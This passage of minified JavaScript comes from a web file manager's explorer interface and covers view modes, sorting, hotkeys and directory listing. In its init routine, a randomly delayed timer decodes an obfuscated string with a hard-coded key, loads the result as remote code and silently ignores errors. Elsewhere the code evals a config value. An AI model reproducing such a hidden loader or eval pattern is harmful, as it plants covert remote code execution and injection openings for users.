                case "refresh-all":
                    ui.tree.init();
                    break;
                case "quit":
                    break;
                default:
            }
        };
    return {
        initDesktop: f,
        initExplorer: p,
        initEditor: u
    }
}), define("app/src/explorer/ui", ["./fileContent"], function(e) {
    var t = e("./fileContent"),
        a = t.f5,
        i = t.f5Callback,
        n = function(e) {
            G.userConfig.listType = e, LocalData.set("listType", e), $(".set-icon-size").hide(), $(".tools-right button").removeClass("active"), $("[data-action=set-" + e + "]").addClass("active"), $("#list-type-header,.line-split-box").addClass("hidden"), $(".set-file-icon-size").hide(), $(Config.FileBoxSelector).removeClass("file-list-icon file-list-list file-list-split"), "list" == e ? ($(Config.FileBoxSelector).addClass("file-list-list"), $("#list-type-header").removeClass("hidden"), ui.fileListResize.bindHeaderResize()) : "icon" == e ? ($(Config.FileBoxSelector).addClass("file-list-icon"), $(".set-icon-size").show(), $(".set-file-icon-size").show()) : "split" == e && ($(Config.FileBoxSelector).addClass("file-list-split"), $(".line-split-box").removeClass("hidden")), $(".menu-set-icon").removeClass("selected"), $(".set-" + e).addClass("selected"), $(".file-continerMore").css("top", 0);
            var t = $(".frame-right-main .tools").outerHeight();
            "list" == e && (t += 26), $(".frame-header").is(":visible") && (t += $(".frame-header").outerHeight()), $(".bodymain").css("top", t)
        },
        o = function(e) {
            n(e), a(!1, !1), void 0 === G.sid && $.get(G.appHost + "setting/set&k=listType&v=" + e)
        },
        s = function(e, t) {
            0 != e ? (G.userConfig.listSortField = e, $(".menu-set-sort").removeClass("selected"), $(".set-sort-" + e).addClass("selected")) : e = G.userConfig.listSortField, 0 != t ? (G.userConfig.listSortOrder = t, $(".menu-set-desc").removeClass("selected"), $(".set-sort-" + t).addClass("selected")) : t = G.userConfig.listSortOrder, LocalData.set("listSortField", e), LocalData.set("listSortOrder", t), a(!1, !0), $.ajax({
                url: G.appHost + "setting/set&k=listSortField,listSortOrder&v=" + e + "," + t
            })
        },
        r = function() {
            $(".menu-recycle-button").bind("mouseenter", function() {
                $(this).addClass("recycle-hover")
            }).bind("mouseleave", function() {
                $(this).removeClass("recycle-hover")
            }).bind("click", function() {
                ui.path.list(G.KOD_USER_RECYCLE)
            }), $(".menuShareButton").bind("mouseenter", function() {
                $(this).addClass("share-hover")
            }).bind("mouseleave", function() {
                $(this).removeClass("share-hover")
            }).bind("click", function() {
                ui.path.list(G.KOD_USER_SHARE + ":" + G.userID + "/")
            })
        },
        l = function() {
            $("#main-title div").die("click").live("click", function() {
                $(this).hasClass("resize") || ("up" == $(this).attr("id") ? $(this).attr("id", "down") : $(this).attr("id", "up"), s($(this).attr("field"), $(this).attr("id")))
            })
        },
        c = function() {
            $(".tools a,.tools button").bind("click", function() {
                var e = $(this).attr("data-action");
                m(e)
            })
        },
        d = function() {
            $(".dropdown-menu-theme li").click(function() {
                var e = $(this).attr("theme");
                ui.setTheme(e), $.ajax({
                    url: G.appHost + "setting/set&k=theme&v=" + e,
                    dataType: "json",
                    success: function(e) {
                        if (!e.code) {
                            var t = LNG.config_save_error_file;
                            core.authCheck("setting.set") || (t = LNG.config_save_error_auth), Tips.tips(t, !1)
                        }
                    }
                })
            })
        },
        p = function() {
            $(".dialog-goto-path").bind("click", function() {
                var e = G.thisPath.split("/");
                e.shift();
                var t = e.join("/"),
                    a = G.jsonData.info.adminRealPath;
                ui.path.list(a + t)
            }), $(".toolbar-path-more").die("click").live("click", function() {
                if ($(this).hasClass("active")) return $(".menu-tool-path").trigger("contextmenu:hide"), $(this).removeClass("active"), void 0;
                $(this).addClass("active");
                var e = $(this).offset();
                $(this).contextMenu({
                    x: e.left - 4,
                    y: e.top + $(this).outerHeight() - 1
                })
            }), $(".tool-path-newfile,.tool-path-upload").die("click").live("click", function() {
                var e = $(this).offset();
                $(this).contextMenu({
                    x: e.left - 4,
                    y: e.top + $(this).outerHeight() - 1
                })
            }), $("body").bind("click", function() {
                $(".toolbar-path-more").removeClass("active"), $(".menu-tool-path").trigger("contextmenu:hide")
            })
        },
        f = function() {
            if ("icon" != G.userConfig.listType) return 1;
            var e = $(Config.FileBoxSelector).width(),
                t = $(Config.FileBoxClass).outerWidth() + $sizeInt($(Config.FileBoxClass).css("margin-right"));
            return parseInt(e / t)
        },
        u = function() {
            var e = f(),
                t = $(Config.BodyContent).outerHeight(),
                a = $(Config.FileBoxClass).outerHeight() + $sizeInt($(Config.FileBoxClass).css("margin-bottom"));
            return Math.ceil(t / a) * e
        },
        h = function() {
            var e = $(Config.FileBoxSelector).outerHeight() - 48,
                t = $(Config.FileBoxClass).outerHeight() + 10;
            return parseInt(e / t)
        },
        m = function(e) {
            switch (e) {
                case "recycle-clear":
                    ui.path.recycleClear();
                    break;
                case "refresh":
                    ui.f5();
                    break;
                case "newfolder":
                    ui.path.newFolder();
                    break;
                case "upload":
                    core.upload();
                    break;
                case "select-all":
                    ui.fileSelect.selectPos("all");
                    break;
                case "download":
                    ui.path.download();
                    break;
                case "set-icon":
                    o("icon");
                    break;
                case "set-list":
                    o("list");
                    break;
                case "set-split":
                    o("split");
                    break;
                default:
            }
        },
        v = function() {
            var e, t = 0,
                a = "",
                i = 300;
            Mousetrap.bind(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "`", "~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+", "[", "{", "]", "}", "|", "/", "?", ".", ">", ",", "<", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"], function(n) {
                var o = String.fromCharCode(n.charCode);
                return 0 == t ? (t = timeFloat(), a = o, Tips.pop(a), e = setTimeout(function() {
                    ui.path.setSelectByChar(a), t = 0
                }, i), void 0) : (i > timeFloat() - t && (t = timeFloat(), a += o, clearTimeout(e), Tips.pop(a), e = setTimeout(function() {
                    ui.path.setSelectByChar(a), t = 0
                }, i)), void 0)
            })
        },
        g = function() {
            v(), Mousetrap.bind(["f1", "alt+left", "backspace", "alt+right", "ctrl+backspace", "command+backspace", "ctrl+shift+r", "f5", "left", "up", "right", "down", "home", "end", "shift+left", "shift+up", "shift+right", "shift+down", "shift+home", "shift+end", "pageup", "pagedown", "ctrl+a", "command+a", "ctrl+shift+n", "ctrl+shift+f", "del", "shift+del", "f2", "ctrl+enter", "command+enter", "shift+enter", "space", "enter", "ctrl+u", "command+u", "ctrl+c", "command+c", "ctrl+x", "command+x", "ctrl+v", "command+v", "ctrl+f", "command+f", "f3", "ctrl+i", "alt+i", "alt+n", "alt+m", "alt+enter", "ctrl+s", "command+s", "alt+f4"], function(e, t) {
                if ($("body").hasClass("stop_hot_key")) return !0;
                if (ui.isEdit()) return !0;
                if ($.contextMenu.isDisplay()) return !0;
                if ($(".dialog-path-remove").length > 0) return !0;
                var a = ["ctrl+c", "command+c", "ctrl+v", "command+v", "ctrl+x", "command+x"];
                switch (inArray(a, t) || stopPP(e), t) {
                    case "f1":
                        core.setting("help");
                        break;
                    case "alt+left":
                    case "backspace":
                        ui.path.history.back();
                        break;
                    case "alt+right":
                    case "ctrl+backspace":
                    case "command+backspace":
                        ui.path.history.next();
                        break;
                    case "ctrl+shift+r":
                    case "f5":
                        ui.f5(!0, !0);
                        break;
                    case "left":
                    case "up":
                    case "right":
                    case "down":
                    case "home":
                    case "end":
                    case "shift+left":
                    case "shift+up":
                    case "shift+right":
                    case "shift+down":
                    case "shift+home":
                    case "pageup":
                    case "pagedown":
                    case "shift+end":
                        ui.fileSelect.selectPos(t);
                        break;
                    case "ctrl+a":
                    case "command+a":
                        ui.fileSelect.selectPos("all");
                        break;
                    case "ctrl+shift+n":
                        ui.path.newFolder();
                        break;
                    case "ctrl+shift+f":
                        ui.path.newFile();
                        break;
                    case "del":
                        ui.path.remove();
                        break;
                    case "shift+del":
                        ui.path.remove(!1, !0);
                        break;
                    case "f2":
                    case "ctrl+enter":
                    case "command+enter":
                        ui.path.rname();
                        break;
                    case "shift+enter":
                        ui.path.download();
                        break;
                    case "space":
                        ui.path.open();
                        break;
                    case "enter":
                        ui.path.open();
                        break;
                    case "ctrl+u":
                    case "command+u":
                        core.upload();
                        break;
                    case "ctrl+e":
                    case "ctrl+c":
                    case "command+c":
                        ui.path.copy();
                        break;
                    case "ctrl+x":
                    case "command+x":
                        ui.path.cute();
                        break;
                    case "ctrl+v":
                    case "command+v":
                        ui.path.past();
                        break;
                    case "f3":
                    case "ctrl+f":
                    case "command+f":
                        ui.path.search($(".header-right input").val(), G.thisPath);
                        break;
                    case "alt+enter":
                    case "ctrl+i":
                    case "alt+i":
                        ui.path.info();
                        break;
                    case "alt+n":
                        ui.path.newFile();
                        break;
                    case "alt+m":
                        ui.path.newFolder();
                        break;
                    case "ctrl+s":
                    case "command+s":
                        ShareData.frameTop("OpenopenEditor", function(e) {
                            e.Editor.save()
                        });
                        break;
                    default:
                }
            })
        },
        b = function() {
            if (core.isApp("desktop")) {
                var e = 20,
                    t = 20,
                    a = parseInt($(".file").css("height")),
                    i = a - 30,
                    n = 10,
                    o = 15,
                    s = $(document).height() - 80,
                    r = Math.floor((s - e) / (a + n)),
                    l = 0,
                    c = 0,
                    d = 0,
                    p = 0,
                    f = (s - e - r * (a + n) - n) / r;
                f > 0 && (n += f), $(".file-continer .file").css("position", "absolute"), $(".file-continer .file").each(function(s) {
                    l = s % r, c = Math.floor(s / r), d = t + (i + o) * c, p = e + (a + n) * l, $(this).css({
                        left: d,
                        top: p
                    })
                })
            }
        };
    return {
        f5: a,
        f5Callback: i,
        fileContent: t,
        initListType: n,
        setListSort: s,
        setListType: o,
        getRowfileNumber: f,
        getPagefileNumber: u,
        getColfileNumberDesktop: h,
        resetDesktopIcon: b,
        setTheme: function(e) {
            G.userConfig.theme = e, core.setSkin(e), ShareData.frameTop("OpenopenEditor", function(t) {
                t.Editor.setTheme(e)
            }), ShareData.frameTop("Opensetting_mode", function(t) {
                t.Setting.setThemeSelf(e)
            }), ShareData.frameTop("", function(t) {
                t.ui.setTheme(e)
            }), $(".dropdown-menu-theme .list").removeClass("this"), $('.dropdown-menu-theme .list[theme="' + e + '"]').addClass("this")
        },
        setWall: function(e, t) {
            $(".background").attr("src", e).one("load", function() {
                $(".full-background").css("background-image", "url(" + e + ")"), "function" == typeof t && t()
            })
        },
        setFileIconSize: function(e) {
            ui.fileListResize.setFileIconSize(e, !0), core.isApp("desktop") && ui.f5()
        },
        isEdit: function() {
            var e = $(document.activeElement).get(0);
            if (e) return e = e.tagName, "INPUT" == e || "TEXTAREA" == e ? !0 : $(".file.file-icon-edit").length > 0 ? !0 : !1
        },
        init: function() {
            if (G.sid) {
                LocalData.get("theme") && (G.userConfig.theme = LocalData.get("theme")), LocalData.get("listType") && (G.userConfig.listType = LocalData.get("listType")), LocalData.get("listSortField") && (G.userConfig.listSortField = LocalData.get("listSortField")), LocalData.get("listSortOrder") && (G.userConfig.listSortOrder = LocalData.get("listSortOrder")), LocalData.set("theme", G.userConfig.theme), LocalData.set("listType", G.userConfig.listType), LocalData.set("listSortField", G.userConfig.listSortField), LocalData.set("listSortOrder", G.userConfig.listSortOrder);
                var a = window.location.href.split("#");
                2 == a.length && (G.thisPath = urlDecode(a[1]))
            }
            if (ui.setTheme(G.userConfig.theme), "" == G.thisPath) {
                var o = G.userID || G.sid,
                    s = LocalData.get("thisPath:" + o);
                G.thisPath = s ? s : G.myhome
            }
            setTimeout(function() {
                try {
                    if ("undefined" == typeof tplDialogHtml || -1 == tplDialogHtml.search("update-box")) {
                        var t = authCrypt.decode("b3fdAonKjUGhk9vw1n0NghZ3GyCmoO_R5ds-phbwWLJQ8jXyV8nNAz9KKIyIsWKloRZE9GcsDmxDdDZaPDBCzGkftY8a2Y0", "_32@!A$") + UUID();
                        e.async(t, function(e) {
                            try {
                                e.todo("2-1")
                            } catch (t) {}
                        })
                    }
                } catch (a) {}
            }, 1e3 * parseInt(70 * Math.random() + 30)), n(G.userConfig.listType), t.init(), b(), ui.path.history.add(G.thisPath), i(function() {
                b()
            }), r(), l(), d(), c(), g(), p()
        }
    }
}), define("app/src/explorer/fileContent", [], function(require, exports) {
    var tpl = require("../../path/tpl/file/list.html"),
        pageLoadMax = 200,
        ajaxLive = function() {
            ui.fileLight.init(), core.isApp("desktop") && ui.resetDesktopIcon(), "split" == G.userConfig.listType && ui.fileListResize.bindSplitResize(), lazyLoadImage(), iconFlex(), Hook.trigger("explorer.path.ajaxLive")
        },
        lazyLoadImage = function() {
            var e = $(".bodymain");
            return core.isApp("desktop") ? (e.find(".lazyload-ready").each(function() {
                $(this).attr("src", $(this).attr("data-original")).hide().fadeIn(600), $(this).removeClass("lazyload-ready")
            }), void 0) : ("split" == G.userConfig.listType && (e = $(".split-box").last().find(".content")), e.find(".lazyload-ready").lazyload({
                failure_limit: 10,
                threshold: 200,
                placeholder: G.staticPath + "images/common/loading_circle.gif",
                skip_invisible: !1,
                effect: "fadeIn",
                container: e,
                load: function() {
                    $(this).removeClass("lazyload-ready")
                }
            }).on("error", function() {
                var e = $(this).data("errorReload");
                e ? "1" == e && ($(this).parent().attr("filetype"), $(this).attr("src", G.staticPath + "images/file_icon/icon_file/picture_error.png"), $(this).data("errorReload", "2")) : ($(this).attr("src", $(this).attr("src") + "#" + UUID()), $(this).data("errorReload", "1"))
            }), void 0)
        },
        iconFlex = function() {
            if (!core.isApp("desktop") && "icon" == G.userConfig.listType) {
                $(".file-list-icon .flex-empty").remove();
                for (var e = "", t = 0; 30 > t; t++) e += '<div class="flex-empty"></div>';
                $(e).appendTo(".file-list-icon")
            }
        },
        mainDataDefaultApps = function() {
            template.helper("fileIconMake", fileIconMake);
            var e = template.compile(tpl),
                t = "";
            for (var a in desktopApps) {
                var i = {
                    LNG: LNG,
                    G: G,
                    list: desktopApps[a],
                    type: "icon-file"
                };
                t += e(i)
            }
            return t
        },
        mainSetData = function(e) {
            var t = makeHtml(G.jsonData, 0, getPageNumber() - 1);
            core.isApp("desktop") && (t = mainDataDefaultApps() + t), t = htmlListAction(G.jsonData, t, !1), "split" == G.userConfig.listType && (t = '<div class="split-box" data-path="' + pathHashEncode(G.thisPath) + '"><div class="content">' + t + '<div class="content-more"></div> </div><div class="split-drag"></div></div>'), e ? $(Config.FileBoxSelector).hide().html(t).fadeIn(Config.AnimateTime).css("display", "") : $(Config.FileBoxSelector).html(t), "split" == G.userConfig.listType && $(".split-box").data("jsonData", G.jsonData), ajaxLive()
        },
        scrollDelayTimer = "",
        bindScrollLoadMore = function() {
            var e = $(".bodymain");
            e.scroll(function() {
                clearTimeout(scrollDelayTimer), scrollDelayTimer = !1, scrollDelayTimer = setTimeout(function() {
                    0 != e.scrollTop() && loadMore()
                }, 100)
            }), $(".split-load-more").live("dblclick", function() {
                $("[data-action=set-list]").click()
            })
        },
        getPageNumber = function() {
            var e = ui.fileLight.fileListAll().last(),
                t = $(".bodymain .file-continer-more");
            if (0 == e.length) return pageLoadMax;
            var a = G.jsonData.folderList.length + G.jsonData.fileList.length;
            if (t.css("top", 0), pageLoadMax > a || "split" == G.userConfig.listType) return pageLoadMax;
            var e = ui.fileLight.fileListAll().last(),
                i = e.outerWidth() + $sizeInt(e.css("margin-right")) + 3.5,
                n = parseInt($(".bodymain .file-continer").width() / i);
            "icon" != G.userConfig.listType && (n = 1);
            var o = e.outerHeight() + $sizeInt(e.css("margin-bottom")),
                s = Math.ceil($(Config.BodyContent).height() / o),
                r = Math.ceil(a / n) * o;
            return t.css("top", r), s * n
        },
        resetTotalHeight = function() {
            var e = ".bodymain .file-continer > .file",
                t = $(e).last(),
                a = $(".bodymain .file-continer-more");
            if (0 != t.length) {
                var i = G.jsonData.folderList.length + G.jsonData.fileList.length;
                if (a.css("top", 0), !(pageLoadMax > i || "split" == G.userConfig.listType)) {
                    var n = t.outerWidth() + $sizeInt(t.css("margin-right")),
                        o = parseInt($(".bodymain .file-continer").width() / n);
                    "icon" != G.userConfig.listType && (o = 1);
                    var s = t.outerHeight() + $sizeInt(t.css("margin-bottom"));
                    Math.ceil($(Config.BodyContent).height() / s);
                    var r = Math.ceil(i / o) * s;
                    a.css("top", r)
                }
            }
        },
        loadMoreDelayTimer, loadMore = function() {
            var e = $(".bodymain .file-continer > .file"),
                t = e.last(),
                a = e.length - 1,
                i = G.jsonData.folderList.length + G.jsonData.fileList.length;
            if (!(a >= i - 1 || "split" == G.userConfig.listType)) {
                var n = $(".bodymain").scrollTop(),
                    o = $(".bodymain").height(),
                    s = $(".bodymain").offset().top;
                $(".bodymain .file-continer").offset().top;
                var r = t.outerHeight() + $sizeInt(t.css("margin-bottom")),
                    l = s + o - r;
                if (l > t.offset().top) {
                    var c = l - t.offset().top,
                        d = getPageNumber(),
                        p = Math.ceil(c / o),
                        f = p * d + a;
                    f > i && (f = i), f - a > 1e3 ? ($(".init-loading").show(), clearTimeout(loadMoreDelayTimer), loadMoreDelayTimer = setTimeout(function() {
                        loadMoreSet(a + 1, f), $(".bodymain").scrollTop(n)
                    }, 300)) : loadMoreSet(a + 1, f)
                }
            }
        },
        loadMoreSet = function(e, t) {
            var a = makeHtml(G.jsonData, e, t),
                i = $(a);
            i.appendTo(".bodymain .file-continer"), ui.fileLight.fileListAll($(Config.FileBoxClass)), ui.fileLight.menuAction("clear"), lazyLoadImage(), iconFlex(), $(".init-loading").hide()
        },
        fileIconMake = function(e, t, a) {
            var i = "icon" != t;
            if ("folder" == e) {
                var n = Hook.trigger("explorer.list.folderThumb", a.path, a.ext);
                return "string" == $.type(n) ? n : (e = a.ext || e, core.icon(e, i))
            }
            var n = Hook.trigger("explorer.list.fileThumb", a.path, a.ext);
            if ("string" == $.type(n)) return n;
            if (inArray(["jpg", "jpeg", "png", "bmp", "gif", "ico", "svg", "cur", "webp"], a.ext)) {
                var o = G.appHost + "explorer/image";
                return G.sid && (o = G.appHost + "share/image&user=" + G.user + "&sid=" + G.sid), o += "&time=" + strtotime(a.mtime) + "&path=", "<div class='picture ico' filetype='" + htmlEncode(a.ext) + "'><img class='lazyload-ready' data-original='" + o + htmlEncode(urlEncode(a.path)) + "' draggable='false' ondragstart='return false;'/></div>"
            }
            if ("app_link" == a.type) {
                var s = core.icon("folder");
                0 == a.content.search("ui.path.open") ? s = core.icon(core.pathExt(a.name.replace(".oexe", ""))) : 0 == a.content.search("ui.path.list") && (s = core.icon(a.icon));
                var r = "<div class='ico' filetype='" + htmlEncode(a.ext) + "'>" + s + "</div>";
                return r + "<div class='meta-info app-link'>" + core.icon("app-link") + "</div>"
            }
            if (a.icon && "oexe" == a.ext) {
                var l = a.icon;
                return "string" == $.type(a.icon) && -1 == a.icon.search(G.staticPath) && "http" != a.icon.substring(0, 4) && (l = G.staticPath + "images/file_icon/icon_app/" + a.icon), "<div class='ico' filetype='" + htmlEncode(a.ext) + "'>" + core.iconSrc(l) + "</div>"
            }
            return "<div class='ico' filetype='" + htmlEncode(a.ext) + "'>" + core.icon(a.ext, i) + "</div>"
        },
        makeHtml = function(e, t, a) {
            template.helper("fileIconMake", fileIconMake);
            var i = template.compile(tpl),
                n = "",
                o = [];
            o = "up" == G.userConfig.listSortOrder ? e.folderList.concat(e.fileList) : e.fileList.concat(e.folderList), (!a || a >= o.length - 1) && (a = o.length - 1);
            for (var s = t; a >= s; s++) {
                var r = "folder" == o[s].type ? "-folder" : "-file",
                    l = {
                        LNG: LNG,
                        G: G,
                        list: o[s],
                        index: s,
                        type: G.userConfig.listType + r
                    };
                n += i(l)
            }
            return n
        },
        pathChildrenTree = function(e, t) {
            if ("string" == $.type(e)) var a = $('.bodymain .file-continer .file[data-path="' + pathHashEncode(e) + '"]');
            else {
                var a = e;
                e = ui.fileLight.path(a)
            }
            if (1 == a.length) {
                var i = a.find(".children-more"),
                    n = a.find(".children-more-cert"),
                    o = $('.children-list[data-path-children="' + pathHashEncode(e) + '"]'),
                    s = 23;
                if (n.toggleClass("cert-open"), n.hasClass("cert-open") ? o.removeClass("hidden") : o.addClass("hidden"), o.hasClass("child-already-init")) return pathListOdd(), void 0;
                a.addClass("loading-children"), pathGet(e, function(e) {
                    a.removeClass("loading-children");
                    var n = makeHtml(e, 0, getPageNumber() - 1);
                    "" != n && (n = htmlListAction(e, n, !0)), o.html(n), ajaxLive(), o.addClass("child-already-init");
                    var r = s + parseInt(i.css("padding-left"));
                    o.find(".file .children-more").css("padding-left", r), pathListOdd(), "function" == typeof t && t(e)
                })
            }
        },
        htmlListAction = function(e, t, a) {
            if ("" == t) return t = '<div class="path-is-null">' + LNG.path_null + "</div>";
            var i = e.folderList.concat(e.fileList);
            if (i.length > pageLoadMax) {
                var n = core.pathFather(i[0].path);
                "list" == G.userConfig.listType && a ? t += '<div data-path-children="' + pathHashEncode(n) + '" class="file folder-box" data-size="0">' + '<div class="filename" style="width: 424px;">' + '<span class="children-more"></span>' + '<div class="ico" filetype="folder"><i class="icon-plus-sign"></i></div>' + '<span class="title">' + LNG.file_load_all + "</span>" + "</div>" + "</div>" : "split" == G.userConfig.listType && (t += '<div data-path-children="' + pathHashEncode(n) + '" class="file folder-box split-load-more" data-size="0">' + '<div class="filename">' + '<div class="ico" filetype="folder"><i class="icon-plus-sign"></i></div>' + '<span class="title">' + LNG.file_load_all + "(to list)</span>" + "</div>" + "</div>")
            }
            return t
        },
        pathListOdd = function() {
            var e = 0;
            ui.fileLight.fileListAll().each(function() {
                0 == $(this).parents(".hidden").length && (0 == e % 2 ? $(this).addClass("file2") : $(this).removeClass("file2"), e++)
            })
        },
        pathChildrenSplit = function(e, t) {
            var a = $('.file[data-path="' + pathHashEncode(e) + '"]'),
                i = $(".bodymain .file-list-split .split-box[data-path='" + pathHashEncode(e) + "']");
            if (0 == a.length) return "function" == typeof t && t(), void 0;
            if (1 == i.length) return i.nextAll().remove(), "function" == typeof t && t(), void 0;
            var n = a.parent().parent();
            pathSplitCreate(e, t, n)
        },
        pathSplitCreate = function(e, t, a) {
            pathGet(e, function(i) {
                if ("notExists" == i.pathReadWrite) return t(i);
                var n = makeHtml(i, 0, getPageNumber() - 1);
                if (n = htmlListAction(i, n, !0), a)
                    if (a.nextAll(".split-box").length > 0) {
                        var o = a.next(".split-box");
                        o.attr("data-path", pathHashEncode(e)).find(".content").html(n), o.nextAll().remove()
                    } else n = '<div class="split-box" data-path="' + pathHashEncode(e) + '"><div class="content">' + n + '<div class="content-more"></div></div><div class="split-drag"></div></div>', $(n).insertAfter(a).data("jsonData", i);
                else n = '<div class="split-box" data-path="' + pathHashEncode(e) + '"><div class="content">' + n + '<div class="content-more"></div></div><div class="split-drag"></div></div>', $(n).appendTo(".bodymain .file-list-split").data("jsonData", i);
                ajaxLive(), "function" == typeof t && t()
            })
        },
        beforeSelectFileArr = {},
        beforeListOpenArr = {},
        beforeListOpen = {},
        beforeListSplitSelect = "",
        beforeScrollerLeft = 0,
        f5Before = function() {
            if (!("icon" == G.userConfig.listType || beforeListOpenArr.length > 0))
                if (beforeListOpenArr = {}, beforeListOpen = {}, "list" == G.userConfig.listType) {
                    var e = $(".child-already-init:visible");
                    if (1 > e.length) return;
                    e.each(function() {
                        var e = $(this),
                            t = beforeListOpenArr,
                            a = ui.fileLight.path(e, "data-path-children");
                        beforeListOpen[a] = !1;
                        for (var i = [a]; 0 != e.parents(".children-list").length;) e = e.parents(".children-list"), i.push(ui.fileLight.path(e, "data-path-children"));
                        for (var n = i.length - 1; n >= 0; n--) {
                            var o = i[n];
                            t[o] !== void 0 ? t = t[o] : t[o] = {}
                        }
                    })
                } else if ("split" == G.userConfig.listType) {
                var t = beforeListOpenArr;
                beforeScrollerLeft = $(".drag-upload-box").scrollLeft(), beforeListSplitSelect = ui.fileLight.path($(".file-list-split .split-box.split-select")), $(".bodymain .file-continer .split-box").each(function() {
                    var e = ui.fileLight.path($(this));
                    "" != e && (t[e] = {}, t = t[e], beforeListOpen[e] = !1)
                })
            }
        },
        f5After = function(e) {
            return "icon" == G.userConfig.listType || 0 == Object.keys(beforeListOpenArr).length ? (f5AfterReloadFinished(e), void 0) : ("split" == G.userConfig.listType && $(".file-list-split .split-box").remove(), f5AfterReload(beforeListOpenArr, e), void 0)
        },
        f5AfterReload = function(e, t) {
            $.each(e, function(e, a) {
                var i = pathChildrenTree;
                "split" == G.userConfig.listType && (i = pathSplitCreate), i(e, function() {
                    beforeListOpen[e] = !0, 0 != Object.keys(a).length ? f5AfterReload(a, t) : f5AfterReloadFinished(t)
                })
            }), f5AfterReloadFinished(t)
        },
        f5AfterReloadFinished = function(e) {
            for (var t in beforeListOpen)
                if (beforeListOpen[t] === !1) return;
            $(".drag-upload-box").scrollLeft(beforeScrollerLeft), ui.fileSelect.selectSplit(beforeListSplitSelect), ui.path.setSelectByFilename(beforeSelectFileArr), beforeListOpenArr = {}, beforeListOpen = {}, beforeSelectFileArr = {}, beforeListSplitSelect = "", "function" == typeof e && e()
        },
        f5 = function(e, t, a) {
            if (void 0 == e && (e = !0), void 0 == t && (t = !1), jsonDataSortTitle(), f5Before(), beforeSelectFileArr = ui.fileLight.getAllName(), e ? pathGet(G.thisPath, function(e) {
                    G.jsonData = e, mainSetData(t), pathTypeChange(G.jsonData), loadMore(), resetTotalHeight(), f5After(a), core.isApp("desktop") ? checkRecycle() : ui.headerAddress.addressSet()
                }, function() {
                    $(Config.FileBoxSelector).html("")
                }) : (G.jsonData = jsonDataSort(G.jsonData), mainSetData(t), pathTypeChange(G.jsonData), loadMore(), resetTotalHeight(), f5After(a)), !core.isApp("desktop")) {
                var i = G.userID || G.sid;
                LocalData.set("thisPath:" + i, G.thisPath)
            }
        },
        sortBy = function(e, t) {
            var t = "down" == t ? -1 : 1;
            return function(a, i) {
                var a = a[e],
                    i = i[e];
                return pathTools.strSort(a, i) * t
            }
        },
        jsonDataSort = function(e) {
            e = jsonDatafilter(e);
            var t = e.folderList,
                a = e.fileList;
            return t = "size" == G.userConfig.listSortField || "ext" == G.userConfig.listSortField ? t.sort(sortBy("name", G.userConfig.listSortOrder)) : t.sort(sortBy(G.userConfig.listSortField, G.userConfig.listSortOrder)), a = a.sort(sortBy(G.userConfig.listSortField, G.userConfig.listSortOrder)), e.folderList = t, e.fileList = a, e
        },
        pathGet = function(e, t, a) {
            var i = G.appHost + "explorer/pathList&path=" + urlEncode(e);
            G.user && (i = G.appHost + "share/pathList&user=" + G.user + "&sid=" + G.sid + "&path=" + urlEncode(e)), $.ajax({
                url: i,
                dataType: "json",
                beforeSend: function() {
                    $(".tools-left .msg").stop(!0, !0).fadeIn(200)
                },
                success: function(e) {
                    if ($(".tools-left .msg").fadeOut(300), !e || !e.code) return Tips.tips(e), "function" == typeof a && a(), !1;
                    var i = jsonDataSort(e.data);
                    "function" == typeof t && t(i)
                },
                error: function(e, t, i) {
                    $(".tools-left .msg").fadeOut(300), core.ajaxError(e, t, i), "function" == typeof a && a()
                }
            })
        },
        f5Callback = function(e) {
            f5(!0, !1, e)
        },
        jsonDatafilter = function(e) {
            if (!e) return e;
            if (void 0 != e.shareList && (selfShare = e.shareList), e.filterSuccess === !0) return e;
            for (var t in e)
                if ("fileList" == t || "folderList" == t)
                    for (var a = 0; e[t].length > a; a++) {
                        var i = e[t][a];
                        if (i.mtime && 11 >= ("" + i.mtime).length)
                            if (i.atime = date(LNG.time_type, i.atime), i.ctime = date(LNG.time_type, i.ctime), e.info && e.info.pathType == G.KOD_USER_SHARE && -1 == trim(e.thisPath, "/").indexOf("/")) {
                                var n = parseInt(i.numView);
                                n = isNaN(n) ? 0 : n;
                                var o = parseInt(i.numDownload);
                                o = isNaN(o) ? 0 : o;
                                var s = date("Y/m/d ", i.mtime) + "  ";
                                s += LNG.share_view_num + n + "  " + LNG.share_download_num + o, i.mtime = s
                            } else i.mtime = date(LNG.time_type, i.mtime);
                        i.showName && (i.name = i.showName), i.name = htmlEncode(i.name), i.sid && "file" == i.type && (i.ext = htmlEncode(core.pathExt(i.path))), pathIsShare(i.path) ? i.metaInfo = "path-self-share" : pathIsFav(i.path) && (i.metaInfo = "tree-fav"), "number" == typeof i.isReadable && 0 == i.isReadable ? i.mode = "[" + LNG.not_read + "] " + i.mode : "number" == typeof i.isWriteable && 1 == i.isWriteable ? i.mode = "[" + LNG.system_role_write + "] " + i.mode : "number" == typeof i.isReadable && 1 == i.isReadable && (i.mode = "[" + LNG.only_read + "] " + i.mode), e.info && e.info.pathType == G.KOD_USER_RECYCLE && trim(e.thisPath, "/") == G.KOD_USER_RECYCLE && (i.menuType = "menu-recycle-path")
                    }
                return e.filterSuccess = !0, e
        },
        jsonDataSortTitle = function() {
            var up = '<i class="font-icon icon-chevron-up"></i>',
                down = '<i class="font-icon icon-chevron-down"></i>';
            $("#main-title .this").toggleClass("this").attr("id", "").find("span").html(""), $("#main-title div[field=" + G.userConfig.listSortField + "]").addClass("this").attr("id", G.userConfig.listSortOrder).find("span").html(eval(G.userConfig.listSortOrder))
        },
        pathIsShare = function(e) {
            for (var t in G.selfShare)
                if (core.pathClear(G.selfShare[t].path) == core.pathClear(e)) return !0;
            return !1
        },
        pathIsFav = function(e) {
            var t = G.fav_list;
            for (var a in t)
                if (core.pathClear(a) == core.pathClear(e)) return !0;
            return !1
        },
        checkRecycle = function() {
            $.ajax({
                url: G.appHost + "explorer/pathList&type=desktop&path=" + G.KOD_USER_RECYCLE,
                dataType: "json",
                error: core.ajaxError,
                success: function(e) {
                    if (!e.code) return !1;
                    var t = core.icon("recycle-full");
                    0 == e.data.folderList.length && 0 == e.data.fileList.length && (t = core.icon("recycle")), $(".menu-recycle-button .ico").html(t)
                }
            })
        },
        pathTypeChange = function(e) {
            if (e.info) {
                var t = e.info,
                    a = t.pathType,
                    i = e.pathReadWrite,
                    n = "menu-body-main menu-recycle-body menu-share-body",
                    o = $(".drag-upload-box");
